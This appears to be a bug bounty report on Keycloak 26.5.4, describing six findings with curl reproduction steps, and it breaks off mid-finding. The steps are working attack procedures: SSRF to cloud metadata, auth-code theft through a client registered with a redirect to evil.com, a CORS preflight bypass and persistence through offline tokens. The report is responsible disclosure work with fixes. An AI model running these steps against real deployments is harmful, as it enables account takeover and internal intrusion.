# Bug Bounty Report — Keycloak 26.5.4

**Program:** Keycloak / Red Hat Bug Bounty
**Tested version:** 26.5.4 (latest stable as of 2026-02-20)
**Test environment:** Fresh install, Quarkus distribution
**Researcher test instance:** `http://46.101.162.187:8080`

---

## Finding #1 — MEDIUM

### Vulnerability Title
**CORS OPTIONS Preflight Bypass: `webOrigins` Not Enforced for Preflight Requests — Enables Cross-Origin Write CSRF and null-Origin Credential Leakage**

### Affected Component
Keycloak Server (Quarkus distribution) — OIDC/OAuth2 endpoints and Admin REST API

### Affected Version
26.5.4 (latest stable). Reproducible on fresh default installation.

### Vulnerability Type
Cross-Origin Resource Sharing (CORS) misconfiguration — OPTIONS preflight bypass

### CVSS Score (estimated)
**5.3 (Medium)** — AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N

---

### Technical Description

Keycloak allows administrators to configure a per-client `webOrigins` allowlist restricting which browser origins may make cross-origin requests to OIDC endpoints. The `webOrigins` policy is **correctly enforced in actual (non-OPTIONS) responses** — unconfigured origins receive no `Access-Control-Allow-Origin` (ACAO) header and browsers block reading the response body.

**However, the `webOrigins` policy is NOT enforced for `OPTIONS` preflight requests.** Keycloak's CORS filter reflects any `Origin` header in `OPTIONS` responses with `Access-Control-Allow-Credentials: true`, regardless of whether the origin is in the client's `webOrigins` allowlist.

**Actual vs OPTIONS behavior (client `webOrigins: ["https://legitimate-app.com"]`):**

| Request Type | Origin | ACAO in response | Credentials | Response body readable |
|---|---|---|---|---|
| `OPTIONS` preflight | `https://evil.com` | ✅ `https://evil.com` | `true` | — (preflight only) |
| `OPTIONS` preflight | `null` | ✅ `null` | `true` | — (preflight only) |
| `POST /token` (actual) | `https://evil.com` | ❌ absent | — | ❌ Browser blocks |
| `GET /userinfo` (actual) | `https://evil.com` | ❌ absent | — | ❌ Browser blocks |
| `GET /admin/realms/*/users` (actual) | `https://evil.com` | ❌ absent | — | ❌ Browser blocks |

**Impact of the preflight bypass:**
1. **Complex CORS requests pass preflight** even from unconfigured origins. The browser sends the actual request, but since the actual response lacks ACAO, the browser blocks the JavaScript from reading the response body. For **write-only operations** (create user, reset password, delete client), the server-side action completes before the browser checks ACAO — damage occurs even though the attacker cannot read the response.
2. **`null` origin accepted** with `credentials: true` in OPTIONS. When `webOrigins` includes `+` (which expands to the configured `redirectUris` origins), `null` is also reflected. The `null` origin arises in browser `file://` pages, `data:` URIs, and `<iframe sandbox>` — all usable in attacker-controlled environments.

**Note on admin API:** The admin console is a SPA using Bearer tokens stored in browser memory (not httpOnly cookies). A malicious page from `evil.com` cannot access the admin token from the legitimate app's memory. The write-CSRF scenario requires the attacker to have already obtained a valid Bearer token through another vector.

---

### Preconditions

1. A Keycloak realm with at least one OIDC client exists (default state).
2. For write-CSRF attack: Attacker has a valid Bearer token (admin token or user token with sufficient privileges), AND victim's browser makes a credentialed cross-origin request.
3. For null-origin: `webOrigins` includes `+` (redirect-URI origins) or specific entries.

---

### Step-by-Step Reproduction

**Setup (already done on test instance):**
- Realm: `test`
- Client: `webapp` (public, `directAccessGrantsEnabled: true`)
- Client `webOrigins`: `["https://legitimate-app.com"]` ← only this origin should be allowed

**Step 1 — Verify webOrigins is configured (should restrict evil.com):**
```bash
curl -s http://localhost:8080/admin/realms/test/clients?clientId=webapp \
  -H "Authorization: Bearer <admin_token>" | python3 -c "
import sys,json; c=json.load(sys.stdin)[0]
print('webOrigins:', c['webOrigins'])
# Expected: ['https://legitimate-app.com']
"
```

**Step 2 — OPTIONS preflight from evil.com (BYPASSED — ACAO returned):**
```bash
curl -sv -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type,Authorization"
```

**Expected:** No `Access-Control-Allow-Origin` header
**Actual:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com     ← BYPASS — webOrigins not checked
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Origin, X-Requested-With, Accept, Authorization, ...
Access-Control-Max-Age: 3600
```

**Step 3 — Actual POST response (correctly restricted — no ACAO):**
```bash
curl -si -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
```
```http
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
                                    ← NO Access-Control-Allow-Origin header
{"access_token":"eyJ..."}          ← Response body NOT readable by evil.com JS
```

**Step 4 — null-origin variant (OPTIONS preflight):**
```bash
curl -si -X OPTIONS http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: POST"
```
```http
Access-Control-Allow-Origin: null        ← null-origin allowed in preflight
Access-Control-Allow-Credentials: true
```

**Step 5 — Admin API OPTIONS preflight (write-CSRF enablement):**
```bash
curl -si -X OPTIONS http://46.101.162.187:8080/admin/realms/test/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type"
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
Access-Control-Allow-Credentials: true
```
If an attacker has obtained a valid admin Bearer token (via social engineering or another vector), JavaScript from `evil.com` can pass this preflight and send write requests to the admin API. The actual admin operations (create user, delete client, etc.) complete before the browser blocks the unreadable response.

---

### HTTP Request/Response Evidence

**OPTIONS preflight — 3 arbitrary origins, all accepted:**
```
Origin: https://evil.com          → ACAO: https://evil.com, credentials: true  [BYPASS]
Origin: http://attacker.internal  → ACAO: http://attacker.internal, credentials: true  [BYPASS]
Origin: null                      → ACAO: null, credentials: true  [BYPASS]
```

**Actual POST /token with evil.com origin — no ACAO (correctly protected):**
```
POST /realms/test/protocol/openid-connect/token HTTP/1.1
Origin: https://evil.com
Content-Type: application/x-www-form-urlencoded

HTTP/1.1 200 OK
[NO Access-Control-Allow-Origin header]
→ Browser blocks JS from reading the token response ✓
```

---

### Attack Scenarios

**Scenario A: Write-CSRF via admin API (requires attacker to have Bearer token)**
1. Attacker obtains admin Bearer token through social engineering (e.g., leaked `.env` file, phishing)
2. Attacker crafts JavaScript page on `evil.com` with the stolen token in Authorization header
3. `evil.com` JS makes `OPTIONS` preflight to admin API → preflight passes (bypass)
4. Actual `POST /admin/realms/test/users` fires with `Authorization: Bearer <stolen_token>`
5. Keycloak creates backdoor user; browser blocks reading the 201 response — but user is created
6. Attacker uses backdoor account for persistent access

**Scenario B: null-origin from sandboxed iframe (preflight bypass for any client)**
1. Attacker hosts page with `<iframe sandbox src="data:text/html,...">` — browser sets `Origin: null`
2. Iframe JavaScript makes `OPTIONS` preflight to any Keycloak endpoint → preflight passes
3. All Keycloak OIDC clients are affected regardless of `webOrigins` configuration
4. If a future related bug allows reading the actual response, null-origin is a bypass for WAF rules that don't expect `Origin: null`

---

### Security Impact

- **Authorization policy bypass**: `webOrigins` per-client configuration is not enforced for `OPTIONS` preflight. Administrators believe they have restricted which origins can make CORS requests — the preflight stage does not enforce this.
- **Write-CSRF potential**: For endpoints that cause irreversible server-side effects (admin write operations), the preflight bypass allows the request to be sent and the action to complete even though the response is unreadable by the attacker.
- **null-origin accepted unconditionally**: Any client can bypass `webOrigins` restrictions using the `null` origin in preflight. Combined with a future response-reading bug, this becomes a complete CORS bypass.
- **Limited direct read impact**: Actual responses correctly omit ACAO for non-configured origins. Token theft / credential read-back from browser JS is NOT confirmed for properly-configured clients.

---

### Remediation Recommendation

**Root cause:** The CORS filter does not validate the incoming `Origin` header against the client's `webOrigins` allowlist for `OPTIONS` preflight requests — only for actual responses.

**Fix:**
1. Apply the same `webOrigins` origin check to `OPTIONS` preflight responses that is already applied to actual responses. The CORS filter should reject preflight requests from unconfigured origins (return 200 with no ACAO header, or 403).
2. **Explicitly reject `Origin: null`** in both preflight and actual responses — never return `Access-Control-Allow-Origin: null` with `credentials: true`.
3. For the admin API, only allow the admin console origin in preflight responses (e.g., `${kc-base-url}/admin`).

---

---

## Finding #2 — MEDIUM

### Vulnerability Title
**Unhandled NullPointerException on `alg:none` JWT — HTTP 500 Instead of 401**

### Affected Component
Keycloak Server — `UserInfoEndpoint.java` — JWT validation pipeline

### Affected Version
26.5.4 (latest stable)

### Vulnerability Type
Improper input validation / unhandled exception in security-critical code path

### CVSS Score (estimated)
**5.3 (Medium)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

---

### Technical Description

When the `/realms/{realm}/protocol/openid-connect/userinfo` endpoint receives a Bearer token whose JWT header declares `"alg": "none"`, Keycloak attempts to retrieve a `SignatureProvider` for the `"none"` algorithm. No such provider is registered, so `getProvider()` returns `null`. The code then attempts to call `.verifier()` on the null provider without a null check, causing an uncaught `NullPointerException`.

The server catches this at the top-level error handler and returns `HTTP 500` instead of `HTTP 401 Unauthorized`. This behavior:
1. Fails to properly reject an invalid/dangerous JWT algorithm
2. Throws an unhandled exception in the authentication pipeline
3. Returns an incorrect HTTP status code that may confuse monitoring systems

---

### Reproduction

**Trigger (no authentication required):**
```bash
# Craft alg:none JWT: header={"alg":"none","typ":"JWT"}, any payload, no signature
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."

curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $ALG_NONE"
```

**Expected response:**
```
HTTP/1.1 401 Unauthorized
{"error":"invalid_token","error_description":"..."}
```

**Actual response:**
```
HTTP/1.1 500 Internal Server Error
{"error":"unknown_error","error_description":"For more on this error consult the server log."}
```

**Server log (Keycloak console):**
```
ERROR [org.keycloak.services.error.KeycloakErrorHandler] (executor-thread-1)
Uncaught server error: java.lang.NullPointerException:
Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"
because the return value of
"org.keycloak.models.KeycloakSession.getProvider(java.lang.Class, String)" is null
  at org.keycloak.protocol.oidc.endpoints.UserInfoEndpoint.issueUserInfoGet(UserInfoEndpoint.java:127)
  ...
```

**Automated PoC:** `python3 poc3_alg_none_npe.py`

---

### Security Impact

- Any unauthenticated attacker can trigger server-side exceptions on demand via the userinfo endpoint
- The NullPointerException in the JWT validation pipeline (security-critical code) indicates `alg:none` is not explicitly blocklisted before provider lookup
- Error rate monitoring systems will show 500s from security-related endpoints, masking actual attack signals
- In complex deployments with custom error handlers or observers, the unexpected exception state may have additional side effects

---

### Remediation Recommendation

In the JWT validation code (`AppAuthManager` or `UserInfoEndpoint`), explicitly reject any token whose `alg` header is `"none"` before attempting provider lookup:

```java
// Before:  session.getProvider(SignatureProvider.class, alg).verifier(kid)
// After:
if ("none".equalsIgnoreCase(alg)) {
    throw new ErrorResponseException(
        OAuthErrorException.INVALID_TOKEN,
        "Algorithm 'none' is not allowed",
        Response.Status.UNAUTHORIZED
    );
}
```

Additionally, add a null check on the provider result:
```java
SignatureProvider provider = session.getProvider(SignatureProvider.class, alg);
if (provider == null) {
    throw new ErrorResponseException(
        OAuthErrorException.INVALID_TOKEN,
        "Unsupported algorithm: " + alg,
        Response.Status.UNAUTHORIZED
    );
}
```

---

---

## Finding #3 — HIGH

### Vulnerability Title
**Offline Token Persistence After Admin Session Revocation — Privilege Backdoor**

### Affected Component
Keycloak Server — Offline Session Management / Token Revocation

### Affected Version
26.5.4 (latest stable). Default configuration with `offline_access` scope.

### Vulnerability Type
Improper session revocation / persistent credential after forced logout

### CVSS Score (estimated)
**7.5 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

---

### Technical Description

Keycloak supports "offline tokens" — long-lived refresh tokens issued when a client requests the `offline_access` scope. These tokens are stored in the database as offline sessions and are intended to function across multiple user login sessions (e.g., for background sync jobs).

**The vulnerability:** When an administrator performs incident response actions after a compromise (force-logout all sessions, push-revocation), offline tokens remain fully valid and can be used to obtain new access tokens indefinitely. Furthermore, the Keycloak admin REST API provides **no working endpoint to delete individual offline sessions** — the `DELETE` endpoints return `HTTP 404`.

**Confirmed behaviors (all tested on Keycloak 26.5.4):**

| Admin Action | Effect on Offline Token |
|---|---|
| `POST /admin/realms/{r}/users/{id}/logout` | ❌ No effect — offline token still valid |
| `POST /admin/realms/{r}/push-revocation` (notBefore push) | ❌ No effect — offline token still valid |
| `DELETE /admin/realms/{r}/users/{id}/offline-sessions/{clientId}` | ❌ 404 Not Found |
| `DELETE /admin/realms/{r}/sessions/{sessionId}` | ❌ 404 Not Found (session not found) |
| **Change user password** (only working mitigation) | ✅ Invalidates offline token |

**Default realm configuration that makes this worse:**
- `revokeRefreshToken: false` (default) — offline tokens are not rotated on use
- `offlineSessionMaxLifespanEnabled: false` (default) — offline sessions never expire

This means an attacker who obtains an offline token maintains **unlimited, persistent access** regardless of incident response, unless the victim's password is explicitly changed.

---

### Preconditions

1. Attacker must first obtain an offline token (requires user credentials or another auth vector)
2. The targeted client must have `offline_access` scope available (default in standard Keycloak installation)
3. Admin must attempt forced logout and/or push-revocation without also changing the user's password

---

### Step-by-Step Reproduction

**Setup:**
- Realm: `test`, Client: `test-confidential` (secret: `mysecret123`)
- User: `testuser / Password123`

**Step 1 — Attacker gets offline token:**
```bash
OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=password&username=testuser&password=Password123&scope=offline_access")
OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
```

**Step 2 — Admin forces logout of all user sessions:**
```bash
# Admin token
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Force logout ALL sessions
curl -s -o /dev/null -w "HTTP %{http_code}" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/834f6655-5cb3-46ed-b47e-0e50a139dc6c/logout"
# → HTTP 204 (all active sessions deleted)
```

**Step 3 — Attacker's offline token still works:**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
```
```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6bGZh...",
  "token_type": "Bearer",
  "scope": "openid offline_access profile email"
}
```

**Step 4 — Admin pushes notBefore (forced revocation):**
```bash
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/push-revocation"
# → {}
```

**Step 5 — Offline token STILL works after notBefore:**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
# → Returns VALID access_token
```

**Step 6 — Admin attempts to delete offline sessions (fails):**
```bash
# DELETE offline sessions — returns 404
curl -s -o /dev/null -w "HTTP %{http_code}" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/834f6655.../offline-sessions/$CLIENT_UUID"
# → HTTP 404

# GET offline sessions — still shows active sessions
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/834f6655.../offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; print(len(json.load(sys.stdin)), 'offline sessions still active')"
# → 6 offline sessions still active
```

**Automated PoC:** `bash poc4_offline_token_persistence.sh`

---

### Security Impact

- **Compromised account recovery is incomplete**: When an organization detects a compromised account and forces logout, the attacker's offline token maintains full authentication capability
- **No admin UI indication**: Keycloak admin console's user detail page does not clearly distinguish offline sessions from regular sessions, and the "log out" action does not affect offline sessions
- **Infinite persistence**: With default settings (`revokeRefreshToken: false`, `offlineSessionMaxLifespanEnabled: false`), a single offline token grants permanent access
- **Bypasses notBefore policy**: The standard revocation mechanism (push-revocation) used for compromised clients/users has no effect on offline sessions

---

### Remediation Recommendation

1. **Implement working DELETE endpoint for offline sessions** — `DELETE /admin/realms/{realm}/users/{id}/offline-sessions/{clientId}` should delete the offline sessions, not return 404
2. **Include offline sessions in user force-logout** — `POST /admin/realms/{realm}/users/{id}/logout` should revoke offline sessions for the user, not just active sessions
3. **Apply notBefore policy to offline sessions** — When `push-revocation` sets a new `notBefore` timestamp, offline session refresh tokens issued before that time should be invalidated
4. **Enable `revokeRefreshToken` by default** — Requiring offline token rotation on use limits the window of abuse
5. **Add UI warning** — The admin console should clearly indicate when a user has active offline sessions and provide a way to terminate them

---

---

## Finding #4 — MEDIUM

### Vulnerability Title
**SSRF via Identity Provider `import-config` Endpoint — Internal Network Access**

### Affected Component
Keycloak Server — Admin REST API — `/admin/realms/{realm}/identity-provider/import-config`

### Affected Version
26.5.4 (latest stable)

### Vulnerability Type
Server-Side Request Forgery (SSRF)

### CVSS Score (estimated)
**6.5 (Medium)** — AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N

---

### Technical Description

The Identity Provider import-config endpoint accepts a JSON body with a `fromUrl` parameter. Keycloak makes a server-side HTTP GET request to the specified URL to download an OIDC discovery document. No URL allowlist or denylist is enforced, allowing an attacker with the `manage-identity-providers` realm role to:

1. Probe internal network ports (timing-based port scanning)
2. Access internal HTTP services (internal APIs, metadata endpoints)
3. In cloud deployments: access instance metadata (AWS: `169.254.169.254`, GCP, Azure)

The vulnerability is triggered by any user with the `manage-identity-providers` client role in `realm-management` — this includes realm administrators and any user granted that role.

---

### Reproduction

**Setup (requires admin token):**
```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

**Trigger SSRF to internal HTTP server:**
```bash
# On attacker machine: python3 -m http.server 9999 --bind 127.0.0.1

curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:9999/.well-known/openid-configuration"}' \
  "http://46.101.162.187:8080/admin/realms/test/identity-provider/import-config"
```

**Evidence — HTTP server receives Keycloak's outbound request:**
```
127.0.0.1 - - [21/Feb/2026 03:56:51] "GET /.well-known/openid-configuration HTTP/1.1" 404 -
```

**Cloud metadata access attempt (returns 500 but connection is attempted):**
```bash
curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://169.254.169.254/latest/meta-data/"}' \
  "http://46.101.162.187:8080/admin/realms/test/identity-provider/import-config"
```

**Automated PoC:** `bash poc5_ssrf_idp_import.sh`

---

### Security Impact

- **Internal network enumeration**: Attackers with `manage-identity-providers` role can use response timing to determine which internal ports/hosts are open
- **Internal service access**: On networks with internal APIs, this allows read access to any HTTP endpoint accessible from the Keycloak server
- **Cloud metadata**: In AWS/GCP/Azure deployments, the instance metadata service at `169.254.169.254` may be accessible, potentially exposing IAM credentials
- **Multi-tenant escalation**: In multi-tenant Keycloak deployments, realm admins of one tenant can probe internal infrastructure they would not otherwise have access to

---

### Remediation Recommendation

1. **URL allowlist**: Only allow HTTPS URLs for import-config; block private IP ranges (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), and link-local (`169.254.0.0/16`)
2. **SSRF protection library**: Use a network-level SSRF protection library that validates URLs before outbound connections are made
3. **Metadata service protection**: Deploy Keycloak with IMDSv2 required (AWS) or equivalent cloud protections

---

---

## Finding #5 — HIGH

### Vulnerability Title
**Dynamic Client Registration Bypass: Authenticated Users Can Register Clients with Arbitrary `redirect_uri` — Auth Code Interception**

### Affected Component
Keycloak Server — Dynamic Client Registration (`/realms/{realm}/clients-registrations/openid-connect`) — Client Registration Policy Engine

### Affected Version
26.5.4 (latest stable). Default client registration policy configuration.

### Vulnerability Type
Broken Access Control — Improper enforcement of client registration policies

### CVSS Score (estimated)
**8.0 (High)** — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N

---

### Technical Description

Keycloak's Dynamic Client Registration (DCR) endpoint supports two operation modes controlled by the `subType` of registration policies:
- **`anonymous`** — No authentication required; protected by the "Trusted Hosts" policy that validates the registering host and all client URIs against an allowlist.
- **`authenticated`** — Bearer token required; governed by a separate set of policies.

**The vulnerability:** The `Trusted Hosts` policy (and `client-uris-must-match` check) is only configured in the `anonymous` subType. The **`authenticated` subType has no Trusted Hosts policy**, so any user with a valid Bearer token can register OIDC clients with **completely arbitrary `redirect_uris`** — including attacker-controlled domains like `https://evil.com/*`.

The registered client is:
- **Immediately enabled** — no admin approval required
- **Fully functional** — can be used to initiate authorization code flows
- **Has a client secret** — attacker can exchange auth codes for tokens

**DCR Policy Analysis (Keycloak admin API):**

| Policy | `anonymous` subType | `authenticated` subType |
|---|---|---|
| Trusted Hosts | ✅ Enforced (`client-uris-must-match: true`) | ❌ **NOT PRESENT** |
| Allowed Protocol Mapper Types | ✅ | ✅ |
| Allowed Client Scopes | ✅ | ✅ |
| Max Clients Limit | ✅ | ❌ Not present |
| Consent Required | ✅ (anonymous) | ❌ Not present |

Any realm user can get a Bearer token (e.g., via password grant or authorization code flow). This means the Trusted Hosts restriction provides **zero protection** once an attacker has any valid realm account.

---

### Preconditions

1. Keycloak realm has DCR enabled (default — the endpoint exists in all realms)
2. Attacker has any valid realm user account (standard user privileges, no admin role)
3. Victim has an account in the same realm

---

### Step-by-Step Reproduction

**Step 1 — Attacker obtains Bearer token (any realm user):**
```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

**Step 2 — Register malicious client with arbitrary redirect_uri (NO admin approval):**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Legitimate Looking App",
    "redirect_uris": ["https://evil.com/steal"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }'
```
```json
{
  "client_id": "8c1d58dd-3c9d-4221-9f67-e05e98987056",
  "client_secret": "R5YvWGGRM9a8EktxoyWANlWQaq4vQIlj",
  "redirect_uris": ["https://evil.com/steal"],
  "grant_types": ["authorization_code","refresh_token"]
}
```
**← Client immediately active, no admin approval required**

**Step 3 — Send victim a crafted login URL:**
```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
  client_id=8c1d58dd-...&
  response_type=code&
  redirect_uri=https://evil.com/steal&
  scope=openid+profile+email
```
Victim sees a legitimate Keycloak login page (same domain, real SSL). There is no visible indication the app is malicious.

**Step 4 — Victim logs in; code sent to evil.com:**
```
HTTP 302 → https://evil.com/steal?code=668542a9-a8af-12cd-1c06-8299a1...
                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                       Attacker captures auth code
```

**Step 5 — Attacker exchanges code for victim tokens:**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=8c1d58dd...&client_secret=R5YvWG...&grant_type=authorization_code&code=668542a9...&redirect_uri=https://evil.com/steal"
```
```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6Ikp...",
  "refresh_token": "eyJhbGciOiJIUzUxMiIsInR5cCI6Ikp...",
  "scope": "openid profile email",
  "token_type": "Bearer"
}
```
**← Full victim account access obtained**

**Automated PoC:** `bash poc6_dcr_client_hijack.sh`

---

### HTTP Request/Response Evidence

**DCR registration (authenticated mode — no host/URI policy check):**
```
POST /realms/test/clients-registrations/openid-connect HTTP/1.1
Authorization: Bearer eyJhbGciOiJSUzI1NiIs... (testuser's token)
Content-Type: application/json

{"client_name":"Legitimate Looking App","redirect_uris":["https://evil.com/steal"],...}

HTTP/1.1 201 Created                          ← SUCCESS, no Trusted Hosts rejection
{"client_id":"8c1d58dd-...","client_secret":"R5YvWG...","redirect_uris":["https://evil.com/steal"]}
```

**Compare: Anonymous registration (correctly blocked by Trusted Hosts):**
```
POST /realms/test/clients-registrations/openid-connect HTTP/1.1
[NO Authorization header]

HTTP/1.1 403 Forbidden
{"error":"insufficient_scope","error_description":"Policy 'Trusted Hosts' rejected request"}
```

---

### Attack Scenarios

**Scenario A: Horizontal privilege escalation (user → victim user data)**
1. Attacker registers client with `redirect_uri=https://evil.com/steal` using their own token
2. Sends victim a phishing link: `https://keycloak.example.com/realms/prod/auth?client_id=<malicious>&redirect_uri=https://evil.com/steal`
3. Victim sees legitimate Keycloak domain — logs in trusting the branding
4. Code redirected to evil.com; attacker gets victim's access + refresh tokens
5. Attacker reads victim's email, profile, internal APIs protected by the same IdP

**Scenario B: Vertical privilege escalation (user → admin token)**
1. Same as A, but target is the admin user
2. Attacker sends phishing link to admin — admin logs in
3. If admin used `webapp` client scope with `realm-management` permissions, attacker gets admin token

---

### Security Impact

- **Complete auth code interception**: Attacker with a standard user account can steal tokens of any realm user, including admins
- **No indicators of compromise visible to victim**: Login page is on the legitimate Keycloak domain with real HTTPS
- **Persistent access**: Stolen refresh token provides ongoing access (until password change or manual revocation)
- **Bypasses all redirect_uri allowlisting**: The `Trusted Hosts` protection is entirely ineffective once an attacker has any realm account
- **Scales across all realm users**: One registration enables phishing any number of victims

---

### Remediation Recommendation

1. **Apply Trusted Hosts policy to `authenticated` DCR subType**: Add `trusted-hosts` and `client-uris-must-match: true` policies to the `authenticated` registration policy set (same as `anonymous`)
2. **Require admin approval for DCR**: Add a `client-disabled` policy to `authenticated` subType so registered clients require explicit admin activation before they can be used
3. **Require `create-client` or `manage-clients` role for DCR**: Add a scope-based policy check requiring users to have the `realm-management:manage-clients` role to perform authenticated DCR
4. **Audit existing DCR-registered clients**: Check `/admin/realms/{realm}/clients` for clients with unexpected redirect URIs that were registered via DCR

---

---

## Finding #6 — MEDIUM

### Vulnerability Title
**SSRF via Dynamic Client Registration `jwks_uri` — Low-Privilege Internal Network Probing**

### Affected Component
Keycloak Server — Dynamic Client Registration + JWT Client Authentication (`jwks_uri` fetch)

### Affected Version
26.5.4 (latest stable). Default DCR + JWT client authentication configuration.

### Vulnerability Type
Server-Side Request Forgery (SSRF) — lower privilege than Finding #4

### CVSS Score (estimated)
**6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N

---

### Technical Description

Dynamic Client Registration (RFC 7591) supports the `jwks_uri` parameter, allowing a client to specify an external URL from which Keycloak should fetch the client's JSON Web Key Set. When a client is registered with `token_endpoint_auth_method: private_key_jwt` and a `jwks_uri`, Keycloak makes a server-side HTTP GET request to that URI when validating a JWT client assertion.

**The vulnerability:** Any authenticated realm user can register an OIDC client via DCR with an arbitrary `jwks_uri`. Triggering a JWT authentication attempt with this client causes Keycloak to make an outbound HTTP GET request to any URL — including internal network addresses, loopback, and cloud metadata endpoints.

**Comparison with Finding #4 (SSRF via IdP import-config):**

| Aspect | Finding #4 (IdP import-config) | Finding #6 (DCR jwks_uri) |
|---|---|---|
| Required privilege | `manage-identity-providers` realm role | **Any authenticated user** |
| Trigger | Direct POST to admin API | DCR registration + JWT auth |
| Target | OIDC discovery endpoint | Any URL (JWKS endpoint) |
| User-Agent | Apache HttpClient | Apache HttpClient |

**Impact:** Blind SSRF — Keycloak makes outbound HTTP GET to any attacker-specified URL. Error message analysis and timing differences allow internal port scanning.

---

### Preconditions

1. Attacker has any valid realm user account (no special privileges required)
2. DCR endpoint is available (default — enabled in all realms)

---

### Step-by-Step Reproduction

**Step 1 — Attacker gets Bearer token (any realm user):**
```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

**Step 2 — Register DCR client with internal jwks_uri:**
```bash
# Start listener to capture SSRF request
nc -l -p 49990 > /tmp/ssrf_capture.log &

# Register client with jwks_uri pointing to internal service
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "ssrf-probe",
    "redirect_uris": ["https://test.com/cb"],
    "grant_types": ["client_credentials"],
    "token_endpoint_auth_method": "private_key_jwt",
    "jwks_uri": "http://127.0.0.1:49990/jwks.json"
  }'
# → HTTP 201 {"client_id":"edb7465c-...","jwks_uri":"http://127.0.0.1:49990/jwks.json"}
CLIENT_ID=<from response>
```

**Step 3 — Trigger SSRF by authenticating with JWT assertion:**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$CLIENT_ID&grant_type=client_credentials&
      client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&
      client_assertion=<any.jwt.token>"
```

**Step 4 — Listener receives HTTP request from Keycloak:**
```
